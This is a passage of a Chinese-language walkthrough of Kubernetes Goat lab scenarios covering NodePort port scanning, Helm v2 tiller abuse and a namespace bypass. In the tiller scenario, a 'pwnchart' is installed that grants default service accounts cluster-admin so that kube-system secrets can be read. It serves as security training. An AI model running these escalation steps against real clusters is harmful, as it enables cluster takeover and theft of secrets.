+<h1 id="8-NodePort-exposed-services"><a href="#8-NodePort-exposed-services" class="headerlink" title="8 NodePort exposed services"></a>8 NodePort exposed services</h1><h2 id="8-1-Overview"><a href="#8-1-Overview" class="headerlink" title="8.1 Overview"></a>8.1 Overview</h2><p>在该场景下，我们将看到另一个配置错误，可能会让攻击者访问内部服务和非公开服务。这是创建Kubernetes服务以及集群设置和配置时出现的简单错误配置之一。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-8-ffadb402f58fbe7a3d4845cef3ce9609.png" alt="scenario-8-ffadb402f58fbe7a3d4845cef3ce9609"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>Kubernetes NodePort的工作原理、配置和范围</li>
+<li>执行端口扫描并与Kubernetes节点交互</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>如果任何用户使用NodePort暴露了Kubernetes集群内的任何服务，这意味着运行Kubernetes集群的节点没有启用任何防火墙&#x2F;网络安全。我们需要看到一些未经身份验证和未经授权的服务。</p>
+<p>查询K8S节点外部的IP地址：<code>kubectl get nodes -o wide</code></p>
+<p>当Kubernetes创建NodePort服务时，它会从Kubernetes集群配置中定义的标志中指定的范围内分配端口。（默认情况下，这些端口的范围为30000-32767。）</p>
+<p><strong>目标</strong></p>
+<p>使用NodePort节点的公共IP地址访问metadata-db服务。</p>
+<h2 id="8-2-Solution-Walkthrough"><a href="#8-2-Solution-Walkthrough" class="headerlink" title="8.2 Solution &amp; Walkthrough"></a>8.2 Solution &amp; Walkthrough</h2><h3 id="8-2-1-Method-1"><a href="#8-2-1-Method-1" class="headerlink" title="8.2.1 Method 1"></a>8.2.1 Method 1</h3><p>看看节点的外部IP：<code>kubectl get nodes -o wide</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240811215211379.png" alt="image-20240811215211379"></p>
+<p>呃，由于minikube的配置方式，这里的外部IP并没有暴露</p>
+<p>如果上面暴露了外部IP，则攻击者可以直接对这个IP地址进行端口扫描，具体是30000-32767范围内的端口，可能会找到暴露的NodePort</p>
+<p>这里用直接在内网扫描，模拟暴露了NodePort：<code>sudo nmap -sS 192.168.39.122 -p 30000-32767</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240811220056320.png" alt="image-20240811220056320"></p>
+<p>探测到30003端口，curl访问一下，返回“{“info”: “Refer to internal <a target="_blank" rel="noopener" href="http://metadata-db/">http://metadata-db</a> for more information”}”</p>
+<p>也就是说，这个端口可以外部访问，也就可以直接从外部访问目标Node的这个元数据库</p>
+<p>done？</p>
+<h2 id="8-3-总结"><a href="#8-3-总结" class="headerlink" title="8.3 总结"></a>8.3 总结</h2><p>命令：</p>
+<ul>
+<li>查看K8S节点外部的IP地址：<code>kubectl get nodes -o wide</code></li>
+</ul>
+<h1 id="9-Helm-v2-tiller-to-PwN-the-cluster-Deprecated"><a href="#9-Helm-v2-tiller-to-PwN-the-cluster-Deprecated" class="headerlink" title="9 Helm v2 tiller to PwN the cluster - [Deprecated]"></a>9 Helm v2 tiller to PwN the cluster - [Deprecated]</h1><blockquote>
+<p>此场景已被弃用，只读文档可供学习:)</p>
+</blockquote>
+<h2 id="9-1-Overview"><a href="#9-1-Overview" class="headerlink" title="9.1 Overview"></a>9.1 Overview</h2><p>这是Kubernetes包管理器配置错误的早期之一。Helm是Kubernetes用于部署和管理应用程序的包管理器，默认配置和设置是不安全的，如果攻击者可以访问任何一个pod并且没有网络安全策略（NSP），则攻击者可以获得完全的集群访问权限并接管集群管理权限。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>如何使用Kubernetes服务和helm包管理器</li>
+<li>了解如何将helm charts部署到Kubernetes集群中并对其进行管理</li>
+<li>利用错误配置并接管完整的Kubernetes集群访问权限</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>Helm是Kubernetes的包管理器。这就像ubuntu的apt-get。在这种情况下，我们将看到旧版本的helm（版本2），tiller服务RBAC默认设置，以访问已完成的集群。</p>
+<p>执行以下命令以启动该场景：<code>kubectl run --rm --restart=Never -it --image=madhuakula/k8s-goat-helm-tiller -- bash</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-9-1-32bf613b2d298c043276638983a6198b.png" alt="sc-9-1-32bf613b2d298c043276638983a6198b"></p>
+<p><strong>目标</strong></p>
+<p>获得Kubernetes集群的集群管理员权限，并能够从您所在的pod中获取kube-system命名空间的secrets。</p>
+<h2 id="9-2-Solution-Walkthrough"><a href="#9-2-Solution-Walkthrough" class="headerlink" title="9.2 Solution &amp; Walkthrough"></a>9.2 Solution &amp; Walkthrough</h2><h3 id="9-2-1-Method-1"><a href="#9-2-1-Method-1" class="headerlink" title="9.2.1 Method 1"></a>9.2.1 Method 1</h3><p>默认情况下，helm版本2有一个tiller组件，该组件具有完整的集群管理RBAC权限。</p>
+<p>tiller的默认安装位于kube-system命名空间中，服务名为tiller-deploy，端口为44134。它暴露于0.0.0.0地址，我们可以通过运行一个简单的telnet命令进行验证：<code>telnet tiller-deploy.kube-system 44134</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-9-2-9a014992c28546eca18850f27f59e149.png" alt="sc-9-2-9a014992c28546eca18850f27f59e149"></p>
+<p>现在，我们能够连接到tiller服务端口。我们可以使用helm二进制文件执行操作并与tiller服务通信：<code>helm --host tiller-deploy.kube-system:44134 version</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-9-3-2e02df074ae9542a1a5158d411f1baff.png" alt="sc-9-3-2e02df074ae9542a1a5158d411f1baff"></p>
+<p>试着在部署pwn-chart之前，从kube-system命名空间中获取集群中的Kubernetes secrets：<code>kubectl get secrets -n kube-system</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-9-4-837abec94fd393b5336136d4caec9e63.png" alt="sc-9-4-837abec94fd393b5336136d4caec9e63"></p>
+<p>可以看到无法访问kube-system命名空间的secrets</p>
+<p>现在创建自己的helm chart，为具有完全集群管理员访问权限的default ServiceAccount授予权限</p>
+<p>默认情况下，当前pod部署在默认命名空间中，该命名空间具有default ServiceAccount，因此我们最终只能在当前pod中获得完整的集群管理员权限</p>
+<p><code>helm --host tiller-deploy.kube-system:44134 install --name pwnchart /pwnchart</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-9-5-17711c9020fc1eff69faaea9cf2008e9.png" alt="sc-9-5-17711c9020fc1eff69faaea9cf2008e9"></p>
+<p>现在，pwnchart已经在helm和tiller服务的帮助下部署，它将为所有默认服务帐户提供集群管理员访问权限。因此，让我们再次尝试获取kube-system命名空间secrets：<code>kubectl get secrets -n kube-system</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-9-6-135ceca10e341516ddcc26dbe8c92060.png" alt="sc-9-6-135ceca10e341516ddcc26dbe8c92060"></p>
+<p>这就是获得完全集群接管的默认配置错误之一</p>
+<blockquote>
+<p>这种情况会改变执行tiller部署的方式，有时管理员会将tiller部署到具有特定权限的特定命名空间。从Helm版本3开始，也没有tiller服务来缓解此类漏洞。</p>
+</blockquote>
+<h1 id="10-Analyzing-crypto-miner-container"><a href="#10-Analyzing-crypto-miner-container" class="headerlink" title="10 Analyzing crypto miner container"></a>10 Analyzing crypto miner container</h1><h2 id="10-1-Overview"><a href="#10-1-Overview" class="headerlink" title="10.1 Overview"></a>10.1 Overview</h2><p>针对从公开的镜像仓库下载了黑镜像、挖矿镜像等场景。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>学习分析容器镜像</li>
+<li>了解并操作Kubernetes Jobs</li>
+<li>了解容器镜像manifests、后门和挖矿程序</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>加密货币挖矿已在现代基础设施中流行起来。尤其是像Kubernetes这样的环境是一个容易攻击的目标，因为你甚至可能不会看到容器镜像到底是基于什么构建的，以及它在主动监控方面做了什么。在这种情况下，我们将分析和识别挖矿程序。</p>
+<p><strong>目标</strong></p>
+<p>请在batch-job容器镜像中找到k8s_goat_flag flag。</p>
+<h2 id="10-2-Solution-Walkthrough"><a href="#10-2-Solution-Walkthrough" class="headerlink" title="10.2 Solution &amp; Walkthrough"></a>10.2 Solution &amp; Walkthrough</h2><h3 id="10-2-1-Method-1"><a href="#10-2-1-Method-1" class="headerlink" title="10.2.1 Method 1"></a>10.2.1 Method 1</h3><p>根据提示，执行<code>kubectl get jobs</code>获取当前集群正在运行的job：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240813195934161.png" alt="image-20240813195934161"></p>
+<p>其中batch-check-job这个作业就是我们要分析的目标之一</p>
+<p>检视一下这个job：<code>kubectl describe job batch-check-job</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Name:             batch-check-job</span><br><span class="line">Namespace:        default</span><br><span class="line">Selector:         batch.kubernetes.io/controller-uid=87f47469-77f0-45a4-8e23-f5e9a0c1486d</span><br><span class="line">Labels:           batch.kubernetes.io/controller-uid=87f47469-77f0-45a4-8e23-f5e9a0c1486d</span><br><span class="line">                  batch.kubernetes.io/job-name=batch-check-job</span><br><span class="line">                  controller-uid=87f47469-77f0-45a4-8e23-f5e9a0c1486d</span><br><span class="line">                  job-name=batch-check-job</span><br><span class="line">Annotations:      &lt;none&gt;</span><br><span class="line">Parallelism:      1</span><br><span class="line">Completions:      1</span><br><span class="line">Completion Mode:  NonIndexed</span><br><span class="line">Suspend:          false</span><br><span class="line">Backoff Limit:    6</span><br><span class="line">Start Time:       Tue, 13 Aug 2024 19:49:59 +0800</span><br><span class="line">Pods Statuses:    1 Active (1 Ready) / 0 Succeeded / 0 Failed</span><br><span class="line">Pod Template:</span><br><span class="line">  Labels:  batch.kubernetes.io/controller-uid=87f47469-77f0-45a4-8e23-f5e9a0c1486d</span><br><span class="line">           batch.kubernetes.io/job-name=batch-check-job</span><br><span class="line">           controller-uid=87f47469-77f0-45a4-8e23-f5e9a0c1486d</span><br><span class="line">           job-name=batch-check-job</span><br><span class="line">  Containers:</span><br><span class="line">   batch-check:</span><br><span class="line">    Image:         madhuakula/k8s-goat-batch-check</span><br><span class="line">    Port:          &lt;none&gt;</span><br><span class="line">    Host Port:     &lt;none&gt;</span><br><span class="line">    Environment:   &lt;none&gt;</span><br><span class="line">    Mounts:        &lt;none&gt;</span><br><span class="line">  Volumes:         &lt;none&gt;</span><br><span class="line">  Node-Selectors:  &lt;none&gt;</span><br><span class="line">  Tolerations:     &lt;none&gt;</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason            Age   From            Message</span><br><span class="line">  ----    ------            ----  ----            -------</span><br><span class="line">  Normal  SuccessfulCreate  10m   job-controller  Created pod: batch-check-job-nvdnm</span><br></pre></td></tr></table></figure>
+
+<p>可以获得的信息有：</p>
+<ul>
+<li>各种Label，其中包括了“job-name&#x3D;batch-check-job”，可能可以检索出对应的pod</li>
+<li>运行这个job的容器镜像为“madhuakula&#x2F;k8s-goat-batch-check”</li>
+</ul>
+<p>根据上面获取的Label找出对应的pod：<code>kubectl get pods --namespace default -l &quot;job-name=batch-check-job&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME                    READY   STATUS    RESTARTS   AGE</span><br><span class="line">batch-check-job-nvdnm   1/1     Running   0          19m</span><br></pre></td></tr></table></figure>
+
+<p>得到对应的pod是“batch-check-job-nvdnm”，describe一下可以获得更多的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Name:             batch-check-job-nvdnm</span><br><span class="line">Namespace:        default</span><br><span class="line">Priority:         0</span><br><span class="line">Service Account:  default</span><br><span class="line">Node:             minikube/192.168.39.122</span><br><span class="line">Start Time:       Tue, 13 Aug 2024 19:49:59 +0800</span><br><span class="line">Labels:           batch.kubernetes.io/controller-uid=87f47469-77f0-45a4-8e23-f5e9a0c1486d</span><br><span class="line">                  batch.kubernetes.io/job-name=batch-check-job</span><br><span class="line">                  controller-uid=87f47469-77f0-45a4-8e23-f5e9a0c1486d</span><br><span class="line">                  job-name=batch-check-job</span><br><span class="line">Annotations:      &lt;none&gt;</span><br><span class="line">Status:           Running</span><br><span class="line">IP:               10.244.0.12</span><br><span class="line">IPs:</span><br><span class="line">  IP:           10.244.0.12</span><br><span class="line">Controlled By:  Job/batch-check-job</span><br><span class="line">Containers:</span><br><span class="line">  batch-check:</span><br><span class="line">    Container ID:   docker://a647a8573baa7f25c93da466ded3b12ed3d9f0b19843264bb402625505f77b97</span><br><span class="line">    Image:          madhuakula/k8s-goat-batch-check</span><br><span class="line">    Image ID:       docker-pullable://madhuakula/k8s-goat-batch-check@sha256:8642ce33d356861321c4f3948ee7e7570958cf2929d2e3c528cd529fff462c75</span><br><span class="line">    Port:           &lt;none&gt;</span><br><span class="line">    Host Port:      &lt;none&gt;</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Tue, 13 Aug 2024 19:50:12 +0800</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  0</span><br><span class="line">    Environment:    &lt;none&gt;</span><br><span class="line">    Mounts:</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-p8vkv (ro)</span><br><span class="line">Conditions:</span><br><span class="line">  Type                        Status</span><br><span class="line">  PodReadyToStartContainers   True </span><br><span class="line">  Initialized                 True </span><br><span class="line">  Ready                       True </span><br><span class="line">  ContainersReady             True </span><br><span class="line">  PodScheduled                True </span><br><span class="line">Volumes:</span><br><span class="line">  kube-api-access-p8vkv:</span><br><span class="line">    Type:                    Projected (a volume that contains injected data from multiple sources)</span><br><span class="line">    TokenExpirationSeconds:  3607</span><br><span class="line">    ConfigMapName:           kube-root-ca.crt</span><br><span class="line">    ConfigMapOptional:       &lt;nil&gt;</span><br><span class="line">    DownwardAPI:             true</span><br><span class="line">QoS Class:                   BestEffort</span><br><span class="line">Node-Selectors:              &lt;none&gt;</span><br><span class="line">Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s</span><br><span class="line">                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason     Age   From               Message</span><br><span class="line">  ----    ------     ----  ----               -------</span><br><span class="line">  Normal  Scheduled  21m   default-scheduler  Successfully assigned default/batch-check-job-nvdnm to minikube</span><br><span class="line">  Normal  Pulling    21m   kubelet            Pulling image &quot;madhuakula/k8s-goat-batch-check&quot;</span><br><span class="line">  Normal  Pulled     21m   kubelet            Successfully pulled image &quot;madhuakula/k8s-goat-batch-check&quot; in 10.888s (10.888s including waiting). Image size: 147644725 bytes.</span><br><span class="line">  Normal  Created    21m   kubelet            Created container batch-check</span><br><span class="line">  Normal  Started    21m   kubelet            Started container batch-check</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面需要分析一下这个job底层使用的镜像都有些什么东西，具体而言是看它每一层都做了些什么</p>
+<p><code>docker history --no-trunc madhuakula/k8s-goat-batch-check</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240813201927035.png" alt="image-20240813201927035"></p>
+<p>看起来就是跑了一下这个app程序？</p>
+<p>进这个pod的shell看看，<code>kubectl exec -it batch-check-job-nvdnm sh</code>，也没发现什么名堂？</p>
+<p>？上网搜了一下，似乎和大伙的环境有出入？</p>
+<p>反正意思就是可以通过检查底层镜像的构建过程，查看这个job&#x2F;pod都干了些啥</p>
+<p>done？</p>
+<h2 id="10-3-总结"><a href="#10-3-总结" class="headerlink" title="10.3 总结"></a>10.3 总结</h2><p>命令：</p>
+<ul>
+<li>查看某个镜像的构建过程：<code>docker history --no-trunc madhuakula/k8s-goat-batch-check</code></li>
+</ul>
+<h1 id="11-Kubernetes-namespaces-bypass"><a href="#11-Kubernetes-namespaces-bypass" class="headerlink" title="11 Kubernetes namespaces bypass"></a>11 Kubernetes namespaces bypass</h1><h2 id="11-1-Overview"><a href="#11-1-Overview" class="headerlink" title="11.1 Overview"></a>11.1 Overview</h2><p>大多数人认为，当Kubernetes中有不同的命名空间并且资源被部署和管理时，它们是安全的，不能相互访问。许多现实世界的多租户环境正在被利用，因此关键资源在内部暴露。默认情况下，Kubernetes具有扁平的网络模式，如果我们需要进行分段，那么我们必须通过创建某些边界（如NSP（网络安全策略）等）来创建它们。在这个场景中，我们看到了如何绕过名称空间并访问其他名称空间资源。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-11-e55c9b80c23a981a44e3ab1175875d2a.png" alt="scenario-11-e55c9b80c23a981a44e3ab1175875d2a"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>理解对Kubernetes命名空间的误解</li>
+<li>了解Kubernetes网络平面模式和跨命名空间通信</li>
+<li>对网络端口扫描和漏洞进行侦察和测试</li>
+<li>绕过命名空间限制访问其他命名空间资源</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>默认情况下，Kubernetes使用平面网络模式，这意味着集群内的任何pod&#x2F;服务都可以与其他pod&#x2F;服务通信。默认情况下，群集中的命名空间没有任何网络安全限制。命名空间中的任何人都可以与其他命名空间通信。我们听说Kubernetes Goat喜欢缓存。让我们看看是否可以访问其他名称空间。</p>
+<p>通过以下命令开启这个场景：<code>kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh</code></p>
+<blockquote>
+<p>这里由于网络原因，需要添加<code>--image-pull-policy=Never</code>使用本地镜像创建pod</p>
+<p><code>kubectl run -it hacker-container --image=madhuakula/hacker-container --image-pull-policy=Never -- sh</code></p>
+</blockquote>
+<p><strong>目标</strong></p>
+<p>取得对<code>cache-store</code>的访问以及k8s_goat_flag flag。</p>
+<h2 id="11-2-Solution-Walkthrough"><a href="#11-2-Solution-Walkthrough" class="headerlink" title="11.2 Solution &amp; Walkthrough"></a>11.2 Solution &amp; Walkthrough</h2><h3 id="11-2-1-Method-1"><a href="#11-2-1-Method-1" class="headerlink" title="11.2.1 Method 1"></a>11.2.1 Method 1</h3><p>启动我们的嗨阔pod：<code>kubectl run -it hacker-container --image=madhuakula/hacker-container --image-pull-policy=Never -- sh</code></p>
+<p>首先需要了解集群的IP范围信息，以便我们可以使用端口扫描程序扫描整个集群范围，因为我们不知道这些服务正在运行的是哪个IP地址。</p>
+<p>获取路由信息：<code>ip route</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default via 10.244.0.1 dev eth0 </span><br><span class="line">10.244.0.0/16 dev eth0 scope link  src 10.244.0.24 </span><br></pre></td></tr></table></figure>
+
+<p>查看网卡信息：<code>ifconfig</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 96:9F:B8:D0:81:91  </span><br><span class="line">          inet addr:10.244.0.24  Bcast:10.244.255.255  Mask:255.255.0.0</span><br><span class="line">          inet6 addr: fe80::949f:b8ff:fed0:8191/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:11 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:11 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:850 (850.0 B)  TX bytes:822 (822.0 B)</span><br></pre></td></tr></table></figure>
+
+<p>获取环境变量信息：<code>printenv</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">KUBERNETES_GOAT_HOME_SERVICE_SERVICE_HOST=10.100.46.31</span><br><span class="line">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PROTO=tcp</span><br><span class="line">POOR_REGISTRY_SERVICE_PORT_5000_TCP_ADDR=10.107.68.240</span><br><span class="line">KUBERNETES_PORT=tcp://10.96.0.1:443</span><br><span class="line">METADATA_DB_SERVICE_PORT=80</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">METADATA_DB_PORT=tcp://10.98.7.222:80</span><br><span class="line">ETCDCTL_VERSION=3.4.9</span><br><span class="line">POOR_REGISTRY_SERVICE_PORT_5000_TCP_PORT=5000</span><br><span class="line">HOSTNAME=hacker-container</span><br><span class="line">HEALTH_CHECK_SERVICE_PORT_80_TCP_ADDR=10.100.251.255</span><br><span class="line">POOR_REGISTRY_SERVICE_PORT_5000_TCP_PROTO=tcp</span><br><span class="line">HELMV2_VERSION=2.16.7</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/root</span><br><span class="line">KUBERNETES_GOAT_HOME_SERVICE_PORT=tcp://10.100.46.31:80</span><br><span class="line">KUBERNETES_GOAT_HOME_SERVICE_SERVICE_PORT=80</span><br><span class="line">HEALTH_CHECK_SERVICE_PORT_80_TCP_PORT=80</span><br><span class="line">METADATA_DB_PORT_80_TCP_ADDR=10.98.7.222</span><br><span class="line">HEALTH_CHECK_SERVICE_PORT_80_TCP_PROTO=tcp</span><br><span class="line">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP=tcp://10.104.234.145:3000</span><br><span class="line">INTERNAL_PROXY_API_SERVICE_SERVICE_HOST=10.104.234.145</span><br><span class="line">METADATA_DB_PORT_80_TCP_PORT=80</span><br><span class="line">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_ADDR=10.98.133.196</span><br><span class="line">METADATA_DB_PORT_80_TCP_PROTO=tcp</span><br><span class="line">POOR_REGISTRY_SERVICE_SERVICE_HOST=10.107.68.240</span><br><span class="line">AUDIT2RBAC_VERSION=0.8.0</span><br><span class="line">POOR_REGISTRY_SERVICE_PORT_5000_TCP=tcp://10.107.68.240:5000</span><br><span class="line">POPEYE_VERSION=0.9.0</span><br><span class="line">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_ADDR=10.100.46.31</span><br><span class="line">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PORT=5000</span><br><span class="line">HADOLINT_VERSION=2.10.0</span><br><span class="line">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PROTO=tcp</span><br><span class="line">HEALTH_CHECK_SERVICE_PORT_80_TCP=tcp://10.100.251.255:80</span><br><span class="line">INTERNAL_PROXY_API_SERVICE_PORT=tcp://10.104.234.145:3000</span><br><span class="line">INTERNAL_PROXY_API_SERVICE_SERVICE_PORT=3000</span><br><span class="line">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PORT=80</span><br><span class="line">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PROTO=tcp</span><br><span class="line">TERM=xterm</span><br><span class="line">POOR_REGISTRY_SERVICE_PORT=tcp://10.107.68.240:5000</span><br><span class="line">POOR_REGISTRY_SERVICE_SERVICE_PORT=5000</span><br><span class="line">BUILD_CODE_SERVICE_PORT_3000_TCP_ADDR=10.106.27.124</span><br><span class="line">METADATA_DB_PORT_80_TCP=tcp://10.98.7.222:80</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1</span><br><span class="line">KUBESEC_VERSION=2.11.4</span><br><span class="line">KUBEAUDIT_VERSION=0.18.0</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_HOST=10.98.133.196</span><br><span class="line">BUILD_CODE_SERVICE_PORT_3000_TCP_PORT=3000</span><br><span class="line">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP=tcp://10.98.133.196:5000</span><br><span class="line">BUILD_CODE_SERVICE_PORT_3000_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">HELM_VERSION=3.2.2</span><br><span class="line">KUBECTL_WHOCAN_VERSION=0.4.0</span><br><span class="line">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP=tcp://10.100.46.31:80</span><br><span class="line">METADATA_DB_SERVICE_PORT_HTTP=80</span><br><span class="line">SYSTEM_MONITOR_SERVICE_SERVICE_HOST=10.97.185.173</span><br><span class="line">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_ADDR=10.97.185.173</span><br><span class="line">AMICONTAINED_VERSION=0.4.9</span><br><span class="line">KUBECTL_VERSION=1.24.0</span><br><span class="line">INTERNAL_PROXY_INFO_APP_SERVICE_PORT=tcp://10.98.133.196:5000</span><br><span class="line">INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_PORT=5000</span><br><span class="line">DOCKER_VERSION=19.03.9</span><br><span class="line">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PORT=8080</span><br><span class="line">CFSSL_VERSION=1.6.1</span><br><span class="line">HEALTH_CHECK_SERVICE_SERVICE_HOST=10.100.251.255</span><br><span class="line">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PROTO=tcp</span><br><span class="line">BUILD_CODE_SERVICE_PORT_3000_TCP=tcp://10.106.27.124:3000</span><br><span 